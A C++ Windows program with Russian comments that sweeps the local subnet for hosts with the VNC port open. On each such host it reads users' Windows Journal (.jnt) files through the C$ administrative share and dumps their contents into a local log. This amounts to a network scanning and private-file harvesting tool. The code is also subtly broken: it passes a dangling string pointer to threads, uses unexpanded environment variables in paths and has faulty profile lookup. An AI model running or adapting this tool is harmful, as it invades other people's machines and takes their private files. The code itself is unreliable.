#include "Header.h"

#pragma comment(lib, "ws2_32.lib")
#pragma comment(lib, "iphlpapi.lib")

namespace fs = std::filesystem;

// Функция для чтения содержимого файла
std::string readJournalFile(const fs::path& filePath) {
    try {
        std::ifstream file(filePath, std::ios::binary);
        if (!file) {
            throw std::runtime_error("Error opening file: " + filePath.string());
        }

        std::string content((std::istreambuf_iterator<char>(file)), std::istreambuf_iterator<char>());
        return content;
    }
    catch (const std::exception& e) {
        std::cerr << "Exception: " << e.what() << std::endl;
        return "";
    }
}

// Функция для поиска всех профилей пользователей
std::vector<std::string> getUserProfiles(const std::string& ip) {
    std::vector<std::string> userProfiles;
    // %UserName%
    try {
        fs::path userProfilesPath = fs::path("\\\\") / ip / "%SystemDrive%" / "Users" / "%UserName%";

        if (fs::exists(userProfilesPath) && fs::is_directory(userProfilesPath)) {
            for (const auto& entry : fs::directory_iterator(userProfilesPath)) {
                if (entry.is_directory()) {
                    userProfiles.push_back(entry.path().filename().string());
                }
            }
        }
        else {
            std::cerr << "User profiles directory does not exist: " << userProfilesPath << std::endl;
        }
    }
    catch (const std::exception& e) {
        std::cerr << "Exception in getUserProfiles: " << e.what() << std::endl;
    }

    return userProfiles;
}

// Функция для поиска файлов журналов
void findJournals(const std::string& ip, std::ofstream& logFile) {
    try {
        std::vector<std::string> userProfiles = getUserProfiles(ip);

        std::vector<std::string> journalLocations = {
            "Documents\\My Journal",
            "AppData\\Roaming\\Microsoft\\Windows Journal",
            "AppData\\Local\\Microsoft\\Windows Journal"
        };

        for (const auto& profile : userProfiles) {
            for (const auto& location : journalLocations) {
                fs::path journalPath = fs::path("\\\\") / ip / "C$" / "Users" / profile / location;

                if (fs::exists(journalPath) && fs::is_directory(journalPath)) {
                    for (const auto& entry : fs::directory_iterator(journalPath)) {
                        if (entry.is_regular_file() && entry.path().extension() == ".jnt") {
                            std::string content = readJournalFile(entry.path());
                            if (!content.empty()) {
                                logFile << "Contents of " << entry.path() << " from " << ip << ":\n";
                                logFile << content << "\n\n";
                            }
                        }
                    }
                }
                else {
                    std::cerr << "Journal path does not exist: " << journalPath << std::endl;
                }
            }
        }
    }
    catch (const std::exception& e) {
        std::cerr << "Exception in findJournals: " << e.what() << std::endl;
    }
}

void checkVNC(const char* ip) {
    SOCKET sock = socket(AF_INET, SOCK_STREAM, 0);
    if (sock == INVALID_SOCKET) {
        std::cerr << "Socket creation failed: " << WSAGetLastError() << std::endl;
        return;
    }

    sockaddr_in server;
    server.sin_family = AF_INET;
    server.sin_port = htons(5900); // Порт по умолчанию для VNC
    inet_pton(AF_INET, ip, &server.sin_addr);

    // Устанавливаем таймаут на подключение
    DWORD timeout = 1000; // 1 секунда
    setsockopt(sock, SOL_SOCKET, SO_SNDTIMEO, (const char*)&timeout, sizeof(timeout));

    // Пытаемся подключиться к серверу
    if (connect(sock, (sockaddr*)&server, sizeof(server)) == 0) {
        std::cout << "VNC server found: " << ip << std::endl;

        // Лог-файл для записи содержимого журналов
        std::ofstream logFile("journal_log.log", std::ios::app); // Открываем лог-файл для добавления

        // Поиск журналов
        findJournals(ip, logFile);
        logFile.close();
    }
    else {
        std::cerr << "Failed to connect to VNC server: " << ip << std::endl;
    }

    closesocket(sock);
}

void findVNCServersInNetwork() {
    std::vector<std::thread> threads;

    // Получаем IP-адреса сетевых интерфейсов
    ULONG outBufLen = sizeof(IP_ADAPTER_ADDRESSES);
    PIP_ADAPTER_ADDRESSES pAddresses = nullptr;

    if (GetAdaptersAddresses(AF_INET, 0, NULL, pAddresses, &outBufLen) == ERROR_BUFFER_OVERFLOW) {
        pAddresses = (IP_ADAPTER_ADDRESSES*)malloc(outBufLen);
    }

    if (pAddresses != nullptr && GetAdaptersAddresses(AF_INET, 0, NULL, pAddresses, &outBufLen) == NO_ERROR) {
        for (PIP_ADAPTER_ADDRESSES pCurrAddr = pAddresses; pCurrAddr != NULL; pCurrAddr = pCurrAddr->Next) {
            for (PIP_ADAPTER_UNICAST_ADDRESS pUnicast = pCurrAddr->FirstUnicastAddress; pUnicast != NULL; pUnicast = pUnicast->Next) {
                sockaddr_in* sa_in = reinterpret_cast<sockaddr_in*>(pUnicast->Address.lpSockaddr);
                char ip[INET_ADDRSTRLEN]; // Размер для хранения IP-адреса
                inet_ntop(AF_INET, &sa_in->sin_addr, ip, sizeof(ip)); // Используем inet_ntop

                // Генерируем IP-адреса в той же подсети
                for (int i = 1; i < 255; ++i) {
                    std::string subnet = std::string(ip).substr(0, std::string(ip).find_last_of('.') + 1);
                    std::string fullIP = subnet + std::to_string(i);
                    threads.emplace_back(checkVNC, fullIP.c_str());
                }
            }
        }
    }
    else {
        std::cerr << "Failed to get adapter addresses." << std::endl;
    }

    // Ждем завершения всех потоков
    for (auto& t : threads) {
        t.join();
    }

    free(pAddresses); // Освобождение памяти
}

int main() {
    WSADATA wsaData;
    if (WSAStartup(MAKEWORD(2, 2), &wsaData) != 0) {
        std::cerr << "WSAStartup failed." << std::endl;
        return 1; // Завершаем выполнение, если произошла ошибка
    }

    findVNCServersInNetwork();

    WSACleanup();
    return 0;
}